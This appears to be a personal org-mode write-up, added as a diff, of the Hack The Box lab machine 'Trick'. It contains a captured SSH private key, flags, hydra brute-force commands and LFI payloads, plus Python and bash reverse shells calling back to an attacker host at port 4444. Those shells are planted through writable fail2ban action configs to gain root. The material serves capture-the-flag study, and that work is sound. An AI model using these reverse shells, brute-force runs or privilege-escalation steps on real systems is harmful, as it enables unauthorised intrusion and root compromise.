+  -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+ 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/ Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0 +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6 IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/ KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0 fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+  -----END OPENSSH PRIVATE KEY----- 
+  #+end_src
+  format this with chatgpt, and ssh
+* michael's flag
+  #+begin_src bat
+  $ cat user.txt
+
+0278d7d28a3206de3c233fa1f12cbe51
+  #+end_src
+* check for suid
+  #+begin_src bat
+  michael@trick:~$ sudo -l
+
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+  #+end_src
+  what can we do with this? an obvious thing would be to run hydra to crack the root ssh
+  password while restarting the fail2ban server over and over
+* check if the fail2ban above is the same as the default binary
+  #+begin_src bat
+  michael@trick:~$ which fail2ban
+
+  michael@trick:~$ fail2ban
+  -bash: fail2ban: command not found
+
+  michael@trick:~$ which fail2ban-server
+  /usr/bin/fail2ban-server
+
+  michael@trick:~$ ls -l /usr/bin/fail2ban-*
+  -rwxr-xr-x 1 root root 1419 Sep 23  2018 /usr/bin/fail2ban-client
+  lrwxrwxrwx 1 root root    7 Sep 23  2018 /usr/bin/fail2ban-python -> python3
+  -rwxr-xr-x 1 root root 1280 Sep 23  2018 /usr/bin/fail2ban-regex
+  -rwxr-xr-x 1 root root 1419 Sep 23  2018 /usr/bin/fail2ban-server
+  -rwxr-xr-x 1 root root 2282 Sep 23  2018 /usr/bin/fail2ban-testcases
+
+  michael@trick:~$ file /etc/init.d/fail2ban 
+  /etc/init.d/fail2ban: POSIX shell script, ASCII text executable
+
+  michael@trick:~$ less /etc/init.d/fail2ban
+  #+end_src
+  so it turns out it's a separate script we have sudo rights over; however, after taking a
+  look at it, it just calls the binary
+  #+begin_src bash
+  # fail2ban-client is not a daemon itself but starts a daemon and
+  # loads its with configuration
+  DAEMON=/usr/bin/$NAME-client
+  SCRIPTNAME=/etc/init.d/$NAME
+  #+end_src
+  write a script to repeatedly restart fail2ban
+  #+begin_src bash
+  michael@trick:~$ cat ./restart-f2b.sh
+
+#!/bin/bash
+while true; do
+        sudo /etc/init.d/fail2ban restart
+        sleep 1
+done
+
+  michael@trick:~$ ./restart-f2b.sh
+
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+...
+  #+end_src
+* brute-force root ssh password with hydra
+  #+begin_src bat
+    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166 -I -Vv -t 4
+  #+end_src
+  this takes too long. on second thoughts, is this worth it? the michael user needed a
+  key-based login, so it seems unlikely that =root= login with a password might be allowed.
+  let's confirm by running
+  #+begin_src bat
+  $ ssh root@10.10.11.166 -vvv
+
+debug1: Authentications that can continue: publickey,password
+debug3: remaining preferred: ,password
+debug3: authmethod_is_enabled password
+debug1: Next authentication method: password
+root@10.10.11.166's password: 
+  #+end_src
+  so it looks like it should work; let's try with the shorter password list
+  #+begin_src bat
+    hydra -l root -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt ssh://10.10.11.166 -I -Vv -t 4
+
+1 of 1 target completed, 0 valid password found
+  #+end_src
+* CVE-2021-3156 - sudo version vulnerability
+  looking at [[file:d:/code/htb/academy/modules/linux-privilege-escalation/sudo.org::*overview][this]], discovered the sudo version on the machine is vulnerable to the CVE
+  #+begin_src bat
+  michael@trick:~$ sudo -V | head -n1                        
+
+Sudo version 1.8.27                                        
+
+  michael@trick:~$ cat /etc/lsb-release
+
+cat: /etc/lsb-release: No such file or directory           
+
+  michael@trick:~$ lsb_release -a                            
+
+No LSB modules are available.
+Distributor ID: Debian
+Description:    Debian GNU/Linux 10 (buster)
+Release:        10
+Codename:       buster
+  #+end_src
+  download and transfer the CVE directory to the target:
+  #+begin_src bat
+  $ scp -i michael.key -r CVE-2021-3156/ michael@10.10.11.166:
+  #+end_src
+  however, we don't have =gcc= on the target and we're unable to compile the exploit.
+* guided mode
+  #+begin_src 
+  which group owns /etc/fail2ban/action.d
+  #+end_src
+  ok so it's =security=
+  #+begin_src bat
+  michael@trick:~$ ls -l /etc/fail2ban/
+
+drwxrwx--- 2 root security  4096 Nov 29 08:45 action.d
+-rw-r--r-- 1 root root      2334 Nov 29 08:45 fail2ban.conf
+drwxr-xr-x 2 root root      4096 Nov 29 08:45 fail2ban.d
+drwxr-xr-x 3 root root      4096 Nov 29 08:45 filter.d
+-rw-r--r-- 1 root root     22908 Nov 29 08:45 jail.conf
+drwxr-xr-x 2 root root      4096 Nov 29 08:45 jail.d
+-rw-r--r-- 1 root root       645 Nov 29 08:45 paths-arch.conf
+-rw-r--r-- 1 root root      2827 Nov 29 08:45 paths-common.conf
+-rw-r--r-- 1 root root       573 Nov 29 08:45 paths-debian.conf
+-rw-r--r-- 1 root root       738 Nov 29 08:45 paths-opensuse.conf  
+  #+end_src
+  and who's in the =security= group?
+  #+begin_src bat
+  michael@trick:~$ cat /etc/group | grep 'security'
+
+security:x:1002:michael
+  #+end_src
+  contents of the =action.d= directory
+  #+begin_src bat
+  michael@trick:~/CVE-2021-3156$ ls -l /etc/fail2ban/action.d/
+
+-rw-r--r-- 1 root root  3879 Nov 29 08:45 abuseipdb.conf
+-rw-r--r-- 1 root root   587 Nov 29 08:45 apf.conf
+-rw-r--r-- 1 root root   629 Nov 29 08:45 badips.conf
+-rw-r--r-- 1 root root 10918 Nov 29 08:45 badips.py
+-rw-r--r-- 1 root root  2631 Nov 29 08:45 blocklist_de.conf
+-rw-r--r-- 1 root root  3094 Nov 29 08:45 bsd-ipfw.conf
+-rw-r--r-- 1 root root  2719 Nov 29 08:45 cloudflare.conf
+-rw-r--r-- 1 root root  4669 Nov 29 08:45 complain.conf
+-rw-r--r-- 1 root root  7580 Nov 29 08:45 dshield.conf
+-rw-r--r-- 1 root root  1629 Nov 29 08:45 dummy.conf
+-rw-r--r-- 1 root root  1501 Nov 29 08:45 firewallcmd-allports.conf
+-rw-r--r-- 1 root root  2649 Nov 29 08:45 firewallcmd-common.conf
+-rw-r--r-- 1 root root  2235 Nov 29 08:45 firewallcmd-ipset.conf
+-rw-r--r-- 1 root root  1270 Nov 29 08:45 firewallcmd-multiport.conf
+-rw-r--r-- 1 root root  1898 Nov 29 08:45 firewallcmd-new.conf
+-rw-r--r-- 1 root root  2314 Nov 29 08:45 firewallcmd-rich-logging.conf
+-rw-r--r-- 1 root root  1765 Nov 29 08:45 firewallcmd-rich-rules.conf
+-rw-r--r-- 1 root root   589 Nov 29 08:45 helpers-common.conf
+-rw-r--r-- 1 root root  1402 Nov 29 08:45 hostsdeny.conf
+
+<SNIP>
+  #+end_src
+  how do we use this? i think the solution must be - edit one of the conf files and make it
+  call our nc listener, and restart the service so it loads from the config file
+  let's add the following to =/etc/fail2ban/action.d/badips.py/= and try and get banned
+  #+begin_src python
+    import socket,os,pty
+    
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.0.16.8",4444))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("/bin/sh")
+  #+end_src
+  however, it looks like the the files in the directory are regenerated in short intervals and
+  this is lost.
+  from the man page for =jail.conf=, 
+  #+begin_src 
+  if  you  desire  local  changes  create  an  [actionname].local  file  in  the
+  /etc/fail2ban/action.d directory and override the required settings.
+
+  <SNIP>
+  Commands specified in the [Definition] section are executed through a system shell so shell
+  redirection and process control is allowed.
+  #+end_src
+  according to chatgpt, the file =iptables-multiport.conf= is the one that's used by default
+  when a ban event occurs; so let's create a =.local= version of that file, add a reverse shell:
+  #+begin_src bat
+  bash -i >& /dev/tcp/10.10.16.8/4444 0>&1
+  #+end_src
+  restart fail2ban and run hydra; we get the below errors
+  #+begin_src bat
+  [ERROR] could not connect to target port 22: Connection refused
+  [ERROR] ssh protocol error
+  #+end_src
+  however, no connections on our nc listener
+* solved
+  ok, reran everything through chatgpt. we need to make sure which files are executed when a
+  ban event occurs
+  inside =/etc/fail2ban/default.conf=, under a =[DEFAULT]= block, we can see:
+  #+begin_src 
+  banaction = iptables-multiport
+  #+end_src
+  also:
+  #+begin_src bat
+  $ cat /etc/fail2ban/jail.d/defaults-debian.conf 
+
+[sshd]
+enabled = true
+  #+end_src
+  the default banaction is not overriden in the =[sshd]= block in =default.conf=, meaning we are
+  sure the relevant file is =iptables-multiport.conf=.
+  ok, we made a mistake in the earlier edit of the file and missed out the =/bin/bash -c= part
+  #+begin_src bat
+  actionstart = /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/4444 0>&1'
+  #+end_src
+  after adding this to =iptables-multiport.conf=, restarting fail2ban and running hydra, we get
+  the root shell
+  #+begin_src bat
+  $ nc -lvnp 4444
+
+listening on [any] 4444 ...                                                                                           
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.166] 45540
+bash: cannot set terminal process group (8453): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@trick:/# cat root/root.txt                                          
+
+153763244cd1b22ea9311f15442e7ca3
+  #+end_src
+* learnings
+  - look for group membership and files/directories owned by the group
+* ippsec
+** default nmap run
+   #+begin_src bat
+   $ sudo nmap -sC -sV -oA nmap/trick 10.10.11.166
+   #+end_src
+** zone transfer
+   zone transfer requires TCP, so the nmap response:
+   #+begin_src bat
+     53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+   #+end_src
+   indicates zone transfer might be possible
+** nslookup command to discover the name of the box
+   #+begin_src
+    $ nslookup     
+> server 10.10.11.166
+Default server: 10.10.11.166
+Address: 10.10.11.166#53
+> 10.10.11.166
+166.11.10.10.in-addr.arpa       name = trick.htb.
+> 127.0.0.1
+1.0.0.127.in-addr.arpa  name = localhost.
+   #+end_src
+** dnsrecon
+   could use dnsrecon like so:
+   #+begin_src 
+   $ dnsrecon -r 10.10.11.0/24 -d '' -n 10.10.11.166
+   #+end_src
+   however, this could be suspicious if dns requests are being monitored since this is trying
+   to brute-force reverse lookups over the entire range
+** lfi with php-filter
+   #+begin_src bash
+   GET /index.php?page=php://filter/php://filter/convert.base64-encode/resource=deductions
+   #+end_src
+   use this to read the db-creds file; however, it's a deadend even with the creds.
+** files to check once lfi is confirmed
+   =/proc/self/environ=, =/proc/self/cmdline= - both of these require the use of =Range= headers;
+   #+begin_src 
+     Range: bytes=200:1000
+   #+end_src
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-01_15-09.png @ 2025-12-01 15:10:00
+   [[file:ippsec/2025-12-01_15-10-00_2025-12-01_15-09.png]]
+
+   in this case there's no =environ=, but the result of =cmdline= lets us know the webserver is
+   running as michael - which is how we can arrive at the possibility of exfiltrating
+   michael's ssh key.
+** log poisoning
+   it's also possible to insert a reverse shell by changing the user agent and thus poisoning
+   nginx's log
+** email
+   another cool thing is we can send a mail to michael and access it via the lfi; so send a
+   shell/reverse shell as the data and access it.
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-01_21-31.png @ 2025-12-01 21:31:49
+   [[file:ippsec/2025-12-01_21-31-49_2025-12-01_21-31.png]]
+** what files does the user have access to
+   this is the first thing to do once we're able to get into the system (after =sudo -l=)
+   #+begin_src bat
+   $ find / -user michael 2>/dev/null | less
+   #+end_src
+   inside less, do =&/\/var\/www= to hide files from there; repeat for =/home= and =/proc=
+   then find michael's group and repeat the find command for the group
+   #+begin_src bat
+   $ find / -group security 2>/dev/null | less
+   #+end_src
+** use ffuf to get preprod-marketing subdomain
+   #+begin_src bat
+   $ ffuf -f http://10.108.11.166 -w subdomains-top1million-5000.txt - H 'Host: preprod-FUZZ.trick.htb'
+   #+end_src
+** further boxes
+   - faculty - includes exploitation of the recruitment application from this box
+   - crimestoppers
